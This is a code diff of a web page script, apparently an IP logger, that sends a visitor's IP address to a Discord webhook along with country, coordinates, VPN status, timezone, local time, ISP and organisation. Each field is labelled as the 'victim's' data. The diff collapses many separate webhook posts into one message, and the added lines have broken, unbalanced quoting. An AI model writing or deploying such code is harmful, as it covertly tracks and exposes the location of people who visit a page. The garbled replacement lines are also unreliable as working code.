@@ -44,62 +44,25 @@
         // send the IP address to the Discord webhook
         axios.post(webhookUrl, {
           content: `**IP De la Victime: ${ip}**`
-        });
-         axios.post(webhookUrl, {
-          content: `**Pays de la Victime: ${country}**`
-         });
-                 axios.post(webhookUrl, {
-          content: `**Drapeau du Pays de la Victime: ${flag}**`
-         });
-                 axios.post(webhookUrl, {
-          content: `**Code Du Pays de la Victime: ${countrycode}**`
-         });
-                         axios.post(webhookUrl, {
-          content: `**Code de Geo du pays De la Victime: ${countrygeo}**`
-         });
-                         axios.post(webhookUrl, {
-          content: `**Continent ou se trouve la Victime: ${continent}**`
-         });
-                         axios.post(webhookUrl, {
-          content: `**Code De Geo du Continent ou se trouve la Victime: ${continentcode}**`
-         });
-                         axios.post(webhookUrl, {
-          content: `**ID Du Continent ou se trouve la Victime: ${continentgeo}**`
-         });
-                                 axios.post(webhookUrl, {
-          content: `**X: ${longitude}**`
-         });                         axios.post(webhookUrl, {
-          content: `**Y: ${latitude}**`
-         });
-                                 axios.post(webhookUrl, {
-          content: `**La Victime a un vpn ?: ${vpn}**`
-         });
-                                 axios.post(webhookUrl, {
-          content: `**Nom Du TimeZone de la Victime: ${timezonename}**`
-         });
-                                 axios.post(webhookUrl, {
-          content: `**Nom Raccourci Du TimeZone de la Victime: ${nameabbreviation}**`
-         });
-                                         axios.post(webhookUrl, {
-          content: `**Heure actuelle de la Victime: ${currentime}**`
-         });
-                                         axios.post(webhookUrl, {
-          content: `**Monnaie d'échange du Pays de la Victime: ${currency}**`
-         });
-                                         axios.post(webhookUrl, {
-          content: `**Code de la Monnaie d'échange du pays de la Victime: ${currencycode}**`
-         });
-                                         axios.post(webhookUrl, {
-          content: `**Opérateur de la Victime: ${operateur}**`
-         });
-                                                 axios.post(webhookUrl, {
-          content: `**Type de connexion: ${typedeco}**`
-         });
-                                                 axios.post(webhookUrl, {
-          content: `**ISP: ${isp}**`
-         });
-                                                 axios.post(webhookUrl, {
-          content: `**Nom De l'organisation: ${organame}**`
+"\n>**Pays de la Victime: ${country}**
+"\n>**Drapeau du Pays de la Victime: ${flag}**
+"\n>**Code Du Pays de la Victime: ${countrycode}**
+"\n>**Code de Geo du pays De la Victime: ${countrygeo}**
+"\n>**Continent ou se trouve la Victime: ${continent}**
+"\n>**Code De Geo du Continent ou se trouve la Victime: ${continentcode}**
+"\n>**ID Du Continent ou se trouve la Victime: ${continentgeo}**
+"\n>**X: ${longitude}**
+"\n>**Y: ${latitude}**
+"\n>**La Victime a un vpn ?: ${vpn}**
+"\n>**Nom Du TimeZone de la Victime: ${timezonename}**
+"\n>**Nom Raccourci Du TimeZone de la Victime: ${nameabbreviation}**
+"\n>**Heure actuelle de la Victime: ${currentime}**
+"\n>**Monnaie d'échange du Pays de la Victime: ${currency}**
+"\n>**Code de la Monnaie d'échange du pays de la Victime: ${currencycode}**
+"\n>**Opérateur de la Victime: ${operateur}**
+"\n>**Type de connexion: ${typedeco}**
+"\n>**ISP: ${isp}**
+"\n>**Nom De l'organisation: ${organame}**
         });
       });
   </script>
